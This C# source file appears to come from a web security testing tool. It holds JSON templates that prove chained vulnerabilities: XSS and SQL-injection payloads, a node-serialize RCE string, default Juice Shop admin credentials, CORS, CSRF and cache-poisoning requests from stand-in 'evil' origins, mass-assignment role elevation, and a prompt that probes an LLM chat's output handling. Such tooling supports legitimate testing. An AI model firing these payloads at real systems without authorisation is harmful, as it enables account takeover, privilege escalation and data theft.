using System.Text.Json;
using Trowser.Security.ChainEngine;

namespace Trowser.Security.Workflow;

/// <summary>
/// Built-in proof templates for chain-prove. Templates use {{endpoint}}, {{param}}, {{origin}} placeholders.
/// </summary>
public static class ProofTemplateCatalog
{
    public static bool HasTemplate(string patternId) => Templates.ContainsKey(patternId);

    public static JsonElement? GetTemplate(string patternId)
    {
        if (!Templates.TryGetValue(patternId, out var raw)) return null;
        using var doc = JsonDocument.Parse(raw);
        return doc.RootElement.Clone();
    }

    public static JsonElement SubstituteTemplate(JsonElement template, IReadOnlyDictionary<string, string> vars)
    {
        var text = template.GetRawText();
        foreach (var kv in vars)
            text = text.Replace("{{" + kv.Key + "}}", kv.Value, StringComparison.OrdinalIgnoreCase);
        using var doc = JsonDocument.Parse(text);
        return doc.RootElement.Clone();
    }

    public static Dictionary<string, string> BuildSubstitutionVars(IReadOnlyList<ChainableFinding> findings, string? currentUrl = null)
    {
        var vars = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);

        var corsFinding = findings.FirstOrDefault(f =>
            f.Category.Equals("cors-misconfig", StringComparison.OrdinalIgnoreCase));
        var sensitiveFinding = findings.FirstOrDefault(f =>
            f.Category.Equals("credential-exposure", StringComparison.OrdinalIgnoreCase)
            || f.Category.Equals("default-credentials", StringComparison.OrdinalIgnoreCase))
            ?? findings.FirstOrDefault(f => IsSensitiveDataEndpoint(f.Endpoint));

        var corsEndpoint = PickProveableEndpoint(corsFinding?.Endpoint) ?? PickProveableEndpoint(sensitiveFinding?.Endpoint);
        var sensitiveEndpoint = PickProveableEndpoint(sensitiveFinding?.Endpoint) ?? corsEndpoint;

        var primary = sensitiveFinding ?? corsFinding ?? findings.FirstOrDefault();

        if (!string.IsNullOrWhiteSpace(sensitiveEndpoint))
        {
            vars["endpoint"] = sensitiveEndpoint;
            vars["endpoint0"] = sensitiveEndpoint;
            vars["sensitiveEndpoint"] = sensitiveEndpoint;
            ApplyUriVars(vars, sensitiveEndpoint);
        }

        if (!string.IsNullOrWhiteSpace(corsEndpoint))
        {
            vars["endpoint1"] = corsEndpoint;
            vars["corsEndpoint"] = corsEndpoint;
            if (!vars.ContainsKey("endpoint"))
            {
                vars["endpoint"] = corsEndpoint;
                ApplyUriVars(vars, corsEndpoint);
            }
        }

        if (!vars.ContainsKey("endpoint") && !string.IsNullOrWhiteSpace(currentUrl))
        {
            vars["endpoint"] = currentUrl;
            ApplyUriVars(vars, currentUrl);
        }
        else if (!vars.ContainsKey("endpoint") && !string.IsNullOrWhiteSpace(primary?.Endpoint))
        {
            var ep = PickProveableEndpoint(primary.Endpoint) ?? primary.Endpoint;
            vars["endpoint"] = ep!;
            ApplyUriVars(vars, ep!);
        }

        if (!string.IsNullOrEmpty(primary?.Parameter))
            vars["param"] = primary.Parameter;
        else
            vars["param"] = "q";

        if (!string.IsNullOrEmpty(primary?.Method))
            vars["method"] = primary.Method;
        else if (!vars.ContainsKey("method"))
            vars["method"] = "GET";

        var missingSri = findings.FirstOrDefault(f =>
            f.Category.Equals("missing-sri", StringComparison.OrdinalIgnoreCase));
        if (missingSri?.Endpoint != null)
            vars["scriptUrl"] = missingSri.Endpoint;

        if (!string.IsNullOrWhiteSpace(currentUrl))
            vars["pageUrl"] = currentUrl;

        for (var i = 0; i < findings.Count; i++)
        {
            var f = findings[i];
            if (!string.IsNullOrEmpty(f.Endpoint) && !vars.ContainsKey($"endpoint{i}"))
                vars[$"endpoint{i}"] = PickProveableEndpoint(f.Endpoint) ?? f.Endpoint;
            if (!string.IsNullOrEmpty(f.Category))
                vars[$"category{i}"] = f.Category;
        }

        return vars;
    }

    private static void ApplyUriVars(Dictionary<string, string> vars, string endpoint)
    {
        if (Uri.TryCreate(endpoint, UriKind.Absolute, out var uri))
        {
            vars["origin"] = $"{uri.Scheme}://{uri.Host}";
            vars["host"] = uri.Host;
        }
    }

    private static string? PickProveableEndpoint(string? endpoint)
    {
        if (string.IsNullOrWhiteSpace(endpoint)) return null;
        if (Uri.TryCreate(endpoint, UriKind.Absolute, out var uri))
        {
            var path = uri.AbsolutePath.ToLowerInvariant();
            if (path.EndsWith(".js") || path.EndsWith(".css") || path.EndsWith(".map")
                || path.EndsWith(".woff") || path.EndsWith(".woff2") || path.EndsWith(".png"))
                return null;
        }

        return endpoint;
    }

    private static bool IsSensitiveDataEndpoint(string? endpoint)
    {
        if (string.IsNullOrWhiteSpace(endpoint)) return false;
        var lower = endpoint.ToLowerInvariant();
        return lower.Contains("login") || lower.Contains("whoami") || lower.Contains("profile")
               || lower.Contains("user") || lower.Contains("account") || lower.Contains("token")
               || lower.Contains("auth") || lower.Contains("me");
    }

    private static readonly Dictionary<string, string> Templates = new(StringComparer.OrdinalIgnoreCase)
    {
        ["xss-missing-httponly-session-hijack"] = """
        {
          "name": "xss-missing-httponly-session-hijack",
          "safetyMode": "active",
          "trigger": [{
            "type": "inject",
            "renderUrl": "{{endpoint}}",
            "effectCheck": "document.cookie && document.cookie.length > 0",
            "skipInjection": true,
            "markers": { "PAYLOAD": "<img src=x onerror=alert(1)>" }
          }],
          "oracle": {
            "type": "and",
            "checks": [
              { "type": "effectCheck", "effectCheck": "document.cookie && document.cookie.length > 0" }
            ]
          }
        }
        """,

        ["missing-csp-reflected-xss"] = """
        {
          "name": "missing-csp-reflected-xss",
          "safetyMode": "active",
          "trigger": [{
            "type": "inject",
            "renderUrl": "{{endpoint}}",
            "renderInjection": { "part": "query", "param": "{{param}}", "encode": "component" },
            "payload": "<script>window.__xss_proof=1</script>",
            "skipInjection": true,
            "effectCheck": "window.__xss_proof === 1",
            "waitAfterRenderMs": 500,
            "waitForIdleAfterRender": true
          }],
          "oracle": { "type": "effectCheck", "effectCheck": "window.__xss_proof === 1" }
        }
        """,

        ["idor-weak-auth-unauth-access"] = """
        {
          "name": "idor-weak-auth-unauth-access",
          "safetyMode": "active",
          "setup": [
            { "type": "identity", "action": "apply", "name": "admin", "target": "self" },
            { "type": "fetch", "url": "{{endpoint}}", "method": "GET", "capture": { "adminBody": "body", "adminHash": "bodyHash" } }
          ],
          "trigger": [
            { "type": "identity", "action": "apply", "name": "attacker", "target": "peer", "peer": "attacker" },
            { "type": "fetch", "url": "{{endpoint}}", "method": "GET", "capture": { "attackerBody": "body" } }
          ],
          "oracle": {
            "type": "and",
            "checks": [
              { "type": "fetch", "lastTrigger": true, "expect": { "status": 200 } },
              { "type": "expression", "left": "{{attackerBody}}", "equals": "{{adminBody}}" }
            ]
          },
          "cleanup": [{ "type": "identity", "action": "apply", "name": "admin" }]
        }
        """,

        ["csrf-stored-xss-worm"] = """
        {
          "name": "csrf-stored-xss-worm",
          "safetyMode": "active",
          "setup": [
            { "type": "identity", "action": "apply", "name": "attacker", "target": "self" },
            { "type": "inject", "renderUrl": "{{endpoint}}", "effectCheck": "true", "skipInjection": false,
              "markers": { "PAYLOAD": "<script>window.__stored_xss=1</script>" } }
          ],
          "trigger": [
            { "type": "identity", "action": "apply", "name": "victim", "target": "peer", "peer": "attacker" },
            { "type": "navigate", "url": "{{endpoint}}" }
          ],
          "oracle": { "type": "effectCheck", "effectCheck": "window.__stored_xss === 1" }
        }
        """,

        ["open-redirect-oauth-token-theft"] = """
        {
          "name": "open-redirect-oauth-token-theft",
          "safetyMode": "active",
          "trigger": [
            { "type": "fetch", "url": "{{endpoint}}", "method": "GET", "redirect": "manual",
              "capture": { "redirectStatus": "status", "redirectBody": "body" } }
          ],
          "oracle": {
            "type": "or",
            "checks": [
              { "type": "expression", "left": "{{redirectStatus}}", "equals": "302" },
              { "type": "expression", "left": "{{redirectStatus}}", "equals": "301" },
              { "type": "expression", "left": "{{redirectBody}}", "matches": "code=|token=|access_token" }
            ]
          }
        }
        """,

        ["content-type-confusion-mass-assignment-priv-esc"] = """
        {
          "name": "content-type-confusion-mass-assignment-priv-esc",
          "safetyMode": "active",
          "trigger": [
            { "type": "fetch", "url": "{{endpoint}}", "method": "POST",
              "headers": { "Content-Type": "application/xml" },
              "body": "<root><role>admin</role><isAdmin>true</isAdmin></root>",
              "capture": { "xmlBody": "body", "xmlStatus": "status" } }
          ],
          "oracle": {
            "type": "or",
            "checks": [
              { "type": "expression", "left": "{{xmlBody}}", "matches": "admin|isAdmin|role" },
              { "type": "expression", "left": "{{xmlStatus}}", "equals": "200" }
            ]
          }
        }
        """,

        ["sqli-auth-bypass-proof"] = """
        {
          "name": "sqli-auth-bypass-proof",
          "safetyMode": "active",
          "setup": [
            { "type": "fetch", "url": "{{endpoint}}", "method": "POST",
              "json": { "email": "' OR 1=1 --", "password": "trowser-canary-9f3b2a-not-a-real-password" },
              "capture": { "loginStatus": "status", "loginBody": "body" } }
          ],
          "trigger": [
            { "type": "fetch", "url": "{{endpoint1}}", "method": "GET",
              "capture": { "protectedStatus": "status", "protectedBody": "body" } }
          ],
          "oracle": {
            "type": "and",
            "checks": [
              { "type": "expression", "left": "{{loginStatus}}", "matches": "2\\d\\d" },
              { "type": "expression", "left": "{{loginBody}}", "matches": "token|authentication|access_token|session" },
              { "type": "expression", "left": "{{protectedStatus}}", "matches": "2\\d\\d" },
              { "type": "expression", "left": "{{protectedBody}}", "matches": ".+" }
            ]
          },
          "exportEvidence": true
        }
        """,

        ["ssti-confirmed-arithmetic-proof"] = """
        {
          "name": "ssti-confirmed-arithmetic-proof",
          "safetyMode": "active",
          "trigger": [
            { "type": "fetch", "url": "{{endpoint}}", "method": "GET",
              "capture": { "sstiBody": "body" } }
          ],
          "oracle": {
            "type": "expression",
            "left": "{{sstiBody}}",
            "matches": "49|56"
          }
        }
        """,

        ["rce-indicator-cmd-canary-proof"] = """
        {
          "name": "rce-indicator-cmd-canary-proof",
          "safetyMode": "active",
          "trigger": [
            { "type": "fetch", "url": "{{endpoint}}", "method": "GET",
              "capture": { "canaryBody": "body" } }
          ],
          "oracle": {
            "type": "or",
            "checks": [
              { "type": "expression", "left": "{{canaryBody}}", "matches": "uid=|/bin/|/usr/bin/" },
              { "type": "expression", "left": "{{canaryBody}}", "matches": "49|56" }
            ]
          }
        }
        """,

        ["role-self-promote"] = """
        {
          "name": "role-self-promote",
          "safetyMode": "active",
          "trigger": [
            { "type": "fetch", "url": "{{endpoint}}", "method": "PUT",
              "json": { "role": "admin" },
              "capture": { "putStatus": "status", "putBody": "body" } }
          ],
          "oracle": {
            "type": "and",
            "checks": [
              { "type": "fetch", "url": "{{endpoint}}", "method": "GET", "capture": { "verifyBody": "body" } },
              { "type": "expression", "left": "{{verifyBody}}", "matches": "\"role\"\\s*:\\s*\"admin\"|\"isAdmin\"\\s*:\\s*true|admin" }
            ]
          }
        }
        """,

        ["cors-sensitive-data-theft"] = """
        {
          "name": "cors-sensitive-data-theft",
          "safetyMode": "active",
          "setup": [
            { "type": "fetch", "url": "{{endpoint1}}", "method": "GET",
              "headers": { "Origin": "https://evil-cors-proof.trowser.test" },
              "capture": { "corsStatus": "status", "corsBody": "body", "corsBodyHash": "bodyHash" } }
          ],
          "trigger": [
            { "type": "fetch", "url": "{{endpoint0}}", "method": "GET",
              "headers": { "Origin": "https://evil-cors-proof.trowser.test" },
              "capture": { "sensitiveStatus": "status", "sensitiveBody": "body" } }
          ],
          "oracle": {
            "type": "and",
            "checks": [
              {
                "type": "or",
                "checks": [
                  { "type": "expression", "left": "{{sensitiveStatus}}", "matches": "2\\d\\d" },
                  { "type": "expression", "left": "{{sensitiveBody}}", "matches": "eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\." }
                ]
              },
              { "type": "expression", "left": "{{sensitiveBody}}", "matches": "password|token|email|secret|apiKey|Bearer|authorization|authentication" },
              { "type": "expression", "left": "{{corsBodyHash}}", "matches": ".+" }
            ]
          },
          "exportEvidence": true
        }
        """,

        ["missing-sri-cdn-compromise"] = """
        {
          "name": "missing-sri-cdn-compromise",
          "safetyMode": "active",
          "setup": [
            { "type": "intercept", "action": "auto-fulfill", "disableCache": true,
              "urlPattern": "{{scriptUrl}}", "statusCode": 200,
              "body": "window.__cdn_tamper=1;",
              "headers": { "Content-Type": "application/javascript" } }
          ],
          "trigger": [
            { "type": "load-script", "url": "{{scriptUrl}}", "module": true, "timeoutMs": 15000 }
          ],
          "oracle": { "type": "effectCheck", "effectCheck": "window.__cdn_tamper === 1" },
          "cleanup": [
            { "type": "intercept", "action": "clear" }
          ],
          "exportEvidence": true
        }
        """,

        ["manifest-leak-vulnerable-dep"] = """
        {
          "name": "manifest-leak-vulnerable-dep",
          "safetyMode": "active",
          "trigger": [
            { "type": "fetch", "url": "{{endpoint0}}", "method": "GET",
              "capture": { "manifestBody": "body", "manifestStatus": "status" } }
          ],
          "oracle": {
            "type": "and",
            "checks": [
              { "type": "expression", "left": "{{manifestStatus}}", "equals": "200" },
              { "type": "expression", "left": "{{manifestBody}}", "matches": "dependencies|require|\"name\"" }
            ]
          },
          "exportEvidence": true
        }
        """,

        ["jwt-algorithm-confusion"] = """
        {
          "name": "jwt-algorithm-confusion",
          "safetyMode": "active",
          "setup": [
            { "type": "fetch", "url": "{{jwksUrl}}", "method": "GET",
              "capture": { "jwksBody": "body", "jwksStatus": "status" } }
          ],
          "trigger": [
            { "type": "fetch", "url": "{{endpoint}}", "method": "GET",
              "headers": { "Authorization": "Bearer {{forgedHs256Token}}" },
              "capture": { "proofBody": "body", "proofStatus": "status" } }
          ],
          "oracle": {
            "type": "and",
            "checks": [
              { "type": "expression", "left": "{{proofStatus}}", "matches": "2\\d\\d" },
              { "type": "expression", "left": "{{proofBody}}", "matches": "admin|role|isAdmin|is_admin|superuser|email|userId" }
            ]
          },
          "exportEvidence": true
        }
        """,

        ["node-serialize-rce-proof"] = """
        {
          "name": "node-serialize-rce-proof",
          "safetyMode": "active",
          "setup": [
            { "type": "fetch", "url": "{{endpoint}}", "method": "POST",
              "json": { "orderLinesData": "[{\"_$$ND_FUNC$$_\":\"function(){return 'trowser-rce-proof'}()\"}]" },
              "capture": { "rceStatus": "status", "rceBody": "body" } }
          ],
          "oracle": {
            "type": "or",
            "checks": [
              { "type": "expression", "left": "{{rceBody}}", "matches": "trowser-rce-proof" },
              { "type": "expression", "left": "{{rceBody}}", "matches": "_\\$\\$ND_FUNC\\$\\$_" }
            ]
          },
          "exportEvidence": true
        }
        """,

        ["file-upload-polyglot-rce"] = """
        {
          "name": "file-upload-polyglot-rce",
          "safetyMode": "active",
          "description": "After file-upload-scan accepts a polyglot, fetch a likely served path and check for PHP marker.",
          "trigger": [
            { "type": "fetch", "url": "{{endpoint}}", "method": "GET",
              "capture": { "shellStatus": "status", "shellBody": "body" } }
          ],
          "oracle": {
            "type": "and",
            "checks": [
              { "type": "expression", "left": "{{shellStatus}}", "matches": "2\\d\\d" },
              { "type": "expression", "left": "{{shellBody}}", "matches": "trowser-polyglot|php|<\\?php" }
            ]
          },
          "exportEvidence": true
        }
        """,

        ["default-credential-login-proof"] = """
        {
          "name": "default-credential-login-proof",
          "safetyMode": "active",
          "trigger": [
            { "type": "fetch", "url": "{{endpoint}}", "method": "POST",
              "json": { "email": "admin@juice-sh.op", "password": "admin123" },
              "capture": { "loginStatus": "status", "loginBody": "body" } }
          ],
          "oracle": {
            "type": "and",
            "checks": [
              { "type": "expression", "left": "{{loginStatus}}", "matches": "2\\d\\d" },
              { "type": "expression", "left": "{{loginBody}}", "matches": "token|authentication|access_token|basket|welcome" }
            ]
          },
          "exportEvidence": true
        }
        """,

        ["oauth-pkce-downgrade-proof"] = """
        {
          "name": "oauth-pkce-downgrade-proof",
          "safetyMode": "active",
          "trigger": [
            { "type": "fetch", "url": "{{endpoint}}", "method": "GET", "redirect": "manual",
              "capture": { "authStatus": "status", "authLocation": "body" } }
          ],
          "oracle": {
            "type": "or",
            "checks": [
              { "type": "expression", "left": "{{authStatus}}", "matches": "302|301" },
              { "type": "expression", "left": "{{authLocation}}", "matches": "code=|access_token|id_token" }
            ]
          },
          "exportEvidence": true
        }
        """,

        ["ssrf-cloud-metadata-proof"] = """
        {
          "name": "ssrf-cloud-metadata-proof",
          "safetyMode": "active",
          "description": "Replay SSRF metadata injection and confirm cloud credential indicators in the response body.",
          "trigger": [
            { "type": "fetch", "url": "{{endpoint}}", "method": "{{method}}",
              "capture": { "ssrfStatus": "status", "ssrfBody": "body" } }
          ],
          "oracle": {
            "type": "or",
            "checks": [
              { "type": "expression", "left": "{{ssrfBody}}", "matches": "ami-id|AccessKeyId|instance-id|computeMetadata|subscriptionId" },
              { "type": "expression", "left": "{{ssrfBody}}", "matches": "AKIA[A-Z0-9]{16}" }
            ]
          },
          "exportEvidence": true
        }
        """,

        ["session-fixation-proof"] = """
        {
          "name": "session-fixation-proof",
          "safetyMode": "active",
          "setup": [
            { "type": "fetch", "url": "{{endpoint}}", "method": "GET",
              "capture": { "preCookie": "body" } }
          ],
          "trigger": [
            { "type": "fetch", "url": "{{endpoint0}}", "method": "POST",
              "json": { "email": "admin@juice-sh.op", "password": "admin123" },
              "capture": { "postLoginStatus": "status" } },
            { "type": "fetch", "url": "{{endpoint}}", "method": "GET",
              "capture": { "postCookie": "body" } }
          ],
          "oracle": {
            "type": "and",
            "checks": [
              { "type": "expression", "left": "{{postLoginStatus}}", "matches": "2\\d\\d" },
              { "type": "expression", "left": "{{preCookie}}", "equals": "{{postCookie}}" }
            ]
          },
          "exportEvidence": true
        }
        """,

        ["password-reset-weak-proof"] = """
        {
          "name": "password-reset-weak-proof",
          "safetyMode": "active",
          "trigger": [
            { "type": "fetch", "url": "{{endpoint}}", "method": "POST",
              "json": { "email": "admin@juice-sh.op", "answer": "Johnson", "newPassword": "TrowserReset1!", "repeatPassword": "TrowserReset1!" },
              "capture": { "resetStatus": "status", "resetBody": "body" } }
          ],
          "oracle": {
            "type": "and",
            "checks": [
              { "type": "expression", "left": "{{resetStatus}}", "matches": "2\\d\\d" },
              { "type": "expression", "left": "{{resetBody}}", "matches": "success|reset|changed|updated" }
            ]
          },
          "exportEvidence": true
        }
        """,

        ["transaction-rollback-proof"] = """
        {
          "name": "transaction-rollback-proof",
          "safetyMode": "active",
          "setup": [
            { "type": "fetch", "url": "{{balanceUrl}}", "method": "GET",
              "capture": { "balanceBefore": "body", "balanceStatusBefore": "status" } }
          ],
          "trigger": [
            { "type": "fetch", "url": "{{step1Url}}", "method": "POST", "body": "{{step1Body}}",
              "headers": { "Content-Type": "application/json" },
              "capture": { "step1Status": "status" } },
            { "type": "mock", "urlPattern": "{{step2Url}}", "statusCode": 500, "method": "POST",
              "body": "{\"error\":\"Internal Server Error\"}" },
            { "type": "fetch", "url": "{{step2Url}}", "method": "POST", "body": "{{step2Body}}",
              "headers": { "Content-Type": "application/json" },
              "capture": { "step2Status": "status" } },
            { "type": "fetch", "url": "{{balanceUrl}}", "method": "GET",
              "capture": { "balanceAfter": "body", "balanceStatusAfter": "status" } }
          ],
          "cleanup": [
            { "type": "mock", "action": "clear" }
          ],
          "oracle": {
            "type": "and",
            "checks": [
              { "type": "expression", "left": "{{step2Status}}", "matches": "500" },
              { "type": "expression", "left": "{{balanceStatusBefore}}", "matches": "2\\d\\d" },
              { "type": "expression", "left": "{{balanceStatusAfter}}", "matches": "2\\d\\d" },
              { "type": "expression", "left": "{{balanceBefore}}", "matches": "^\\s*[\\[{]" },
              { "type": "expression", "left": "{{balanceAfter}}", "matches": "^\\s*[\\[{]" },
              { "type": "expression", "left": "{{balanceAfter}}", "equals": "{{balanceBefore}}" }
            ]
          },
          "exportEvidence": true
        }
        """,

        ["llm05-improper-output-handling-proof"] = """
        {
          "name": "llm05-improper-output-handling-proof",
          "safetyMode": "active",
          "description": "Oracle uses assistant-only chat capture (or network body). Matching the just-submitted user prompt is not proof.",
          "trigger": [
            {
              "type": "llm-chat",
              "prompt": "Reply with exactly this HTML and nothing else: <script>alert('xss-probe')</script>",
              "waitAfterSubmitMs": 8000,
              "capture": { "responseText": "responseText", "responseHtml": "responseHtml" }
            }
          ],
          "oracle": {
            "type": "and",
            "checks": [
              {
                "type": "or",
                "checks": [
                  { "type": "expression", "left": "{{responseHtml}}", "matches": "<script>alert\\('xss-probe'\\)</script>" },
                  { "type": "expression", "left": "{{responseText}}", "matches": "<script>alert\\('xss-probe'\\)</script>" }
                ]
              },
              {
                "type": "expression",
                "left": "{{responseText}}",
                "notMatches": "Reply with exactly this HTML"
              }
            ]
          },
          "exportEvidence": true
        }
        """,

        ["csrf-samesite-bypass"] = """
        {
          "name": "csrf-samesite-bypass",
          "safetyMode": "active",
          "description": "Tests if SameSite cookie attribute can be bypassed by navigating from an attacker page.",
          "setup": [
            { "type": "fetch", "url": "{{endpoint}}", "method": "GET",
              "capture": { "baselineStatus": "status", "baselineBody": "body" } }
          ],
          "trigger": [
            { "type": "fetch", "url": "{{endpoint}}", "method": "POST",
              "headers": { "Origin": "https://evil-csrf.trowser.test", "Referer": "https://evil-csrf.trowser.test/attack.html" },
              "json": { "action": "{{param}}" },
              "capture": { "csrfStatus": "status", "csrfBody": "body" } }
          ],
          "oracle": {
            "type": "and",
            "checks": [
              { "type": "expression", "left": "{{csrfStatus}}", "matches": "2\\d\\d" },
              { "type": "expression", "left": "{{csrfBody}}", "matches": "success|updated|created|ok|true" }
            ]
          },
          "exportEvidence": true
        }
        """,

        ["cors-credentials-leak"] = """
        {
          "name": "cors-credentials-leak",
          "safetyMode": "active",
          "description": "Verifies CORS allows credential-attached cross-origin reads from an arbitrary origin.",
          "trigger": [
            { "type": "fetch", "url": "{{endpoint}}", "method": "GET",
              "headers": { "Origin": "https://evil-cors.trowser.test" },
              "credentials": "include",
              "capture": { "corsStatus": "status", "corsBody": "body", "corsHeaders": "headers" } }
          ],
          "oracle": {
            "type": "and",
            "checks": [
              { "type": "expression", "left": "{{corsStatus}}", "matches": "2\\d\\d" },
              { "type": "expression", "left": "{{corsHeaders}}", "matches": "access-control-allow-credentials.*true" },
              { "type": "expression", "left": "{{corsBody}}", "matches": "token|email|password|secret|apiKey|Bearer|user|account" }
            ]
          },
          "exportEvidence": true
        }
        """,

        ["subdomain-takeover-fingerprint"] = """
        {
          "name": "subdomain-takeover-fingerprint",
          "safetyMode": "active",
          "description": "Fetches a dangling CNAME URL and confirms a takeover fingerprint in the response.",
          "trigger": [
            { "type": "fetch", "url": "{{endpoint}}", "method": "GET",
              "capture": { "takeoverStatus": "status", "takeoverBody": "body" } }
          ],
          "oracle": {
            "type": "or",
            "checks": [
              { "type": "expression", "left": "{{takeoverBody}}", "matches": "There isn't a GitHub Pages site here|NoSuchBucket|NXDOMAIN|herokucdn\\.com|The specified bucket does not exist|Repository not found|404 Blog is not found|This UserVoice subdomain is currently available" },
              { "type": "expression", "left": "{{takeoverStatus}}", "matches": "404" }
            ]
          },
          "exportEvidence": true
        }
        """,

        ["cache-poison-unkeyed-header"] = """
        {
          "name": "cache-poison-unkeyed-header",
          "safetyMode": "active",
          "description": "Live-key sequence: miss-forcing header, error-inducing unkeyed header, then a fully clean GET of the same URL (no query buster).",
          "setup": [
            { "type": "fetch", "url": "{{endpoint}}", "method": "GET",
              "capture": { "baselineBody": "body", "baselineStatus": "status" } }
          ],
          "trigger": [
            { "type": "fetch", "url": "{{endpoint}}", "method": "GET",
              "headers": { "Pragma": "no-cache" },
              "capture": { "missStatus": "status", "missBody": "body" } },
            { "type": "fetch", "url": "{{endpoint}}", "method": "GET",
              "headers": { "Pragma": "no-cache", "X-Forwarded-Host": "evil-cache.trowser.test" },
              "capture": { "poisonStatus": "status", "poisonBody": "body" } },
            { "type": "fetch", "url": "{{endpoint}}", "method": "GET",
              "capture": { "cachedStatus": "status", "cachedBody": "body" } }
          ],
          "oracle": {
            "type": "and",
            "checks": [
              { "type": "expression", "left": "{{poisonStatus}}", "matches": "[45]\\d\\d" },
              { "type": "or", "checks": [
                { "type": "expression", "left": "{{cachedStatus}}", "matches": "{{poisonStatus}}" },
                { "type": "expression", "left": "{{cachedBody}}", "matches": "evil-cache\\.trowser\\.test" }
              ]}
            ]
          },
          "exportEvidence": true
        }
        """,

        ["bfla-admin-endpoint"] = """
        {
          "name": "bfla-admin-endpoint",
          "safetyMode": "active",
          "description": "Accesses an admin endpoint as a low-privilege user to test broken function-level authorization.",
          "setup": [
            { "type": "identity", "action": "apply", "name": "admin", "target": "self" },
            { "type": "fetch", "url": "{{endpoint}}", "method": "GET",
              "capture": { "adminStatus": "status", "adminBody": "body", "adminHash": "bodyHash" } }
          ],
          "trigger": [
            { "type": "identity", "action": "apply", "name": "user", "target": "peer", "peer": "attacker" },
            { "type": "fetch", "url": "{{endpoint}}", "method": "GET",
              "capture": { "userStatus": "status", "userBody": "body" } }
          ],
          "oracle": {
            "type": "and",
            "checks": [
              { "type": "expression", "left": "{{userStatus}}", "matches": "2\\d\\d" },
              { "type": "expression", "left": "{{userBody}}", "matches": "admin|users|config|settings|dashboard|management" }
            ]
          },
          "cleanup": [{ "type": "identity", "action": "apply", "name": "admin" }],
          "exportEvidence": true
        }
        """,

        ["mass-assignment-role-elevation"] = """
        {
          "name": "mass-assignment-role-elevation",
          "safetyMode": "active",
          "description": "Sends PUT/PATCH with extra role=admin field to test mass assignment privilege escalation.",
          "setup": [
            { "type": "fetch", "url": "{{endpoint}}", "method": "GET",
              "capture": { "beforeBody": "body", "beforeStatus": "status" } }
          ],
          "trigger": [
            { "type": "fetch", "url": "{{endpoint}}", "method": "{{method}}",
              "json": { "role": "admin", "isAdmin": true, "permissions": "all" },
              "capture": { "assignStatus": "status", "assignBody": "body" } },
            { "type": "fetch", "url": "{{endpoint}}", "method": "GET",
              "capture": { "afterBody": "body", "afterStatus": "status" } }
          ],
          "oracle": {
            "type": "and",
            "checks": [
              { "type": "expression", "left": "{{assignStatus}}", "matches": "2\\d\\d" },
              { "type": "expression", "left": "{{afterBody}}", "matches": "\"role\"\\s*:\\s*\"admin\"|\"isAdmin\"\\s*:\\s*true|\"permissions\"\\s*:\\s*\"all\"" }
            ]
          },
          "exportEvidence": true
        }
        """
    };
}
